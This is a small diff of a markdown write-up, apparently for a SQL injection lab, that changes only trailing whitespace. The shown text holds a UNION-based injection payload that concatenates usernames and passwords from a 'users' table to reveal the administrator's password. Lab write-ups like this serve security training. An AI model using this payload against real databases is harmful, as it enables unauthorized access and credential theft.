@@ -16,4 +16,4 @@ The database contains a different table called users, with columns called userna
 
 - To understand which password is belonged to the administrator use the following  payload
     ``` ' UNION SELECT null,username || ' - ' || password FROM users -- ```
-    - ``` || ``` is used for string concatenation so the query will return the out put like ``` username - password ```
+    - ``` || ``` is used for string concatenation so the query will return the out put like ``` username - password ```  
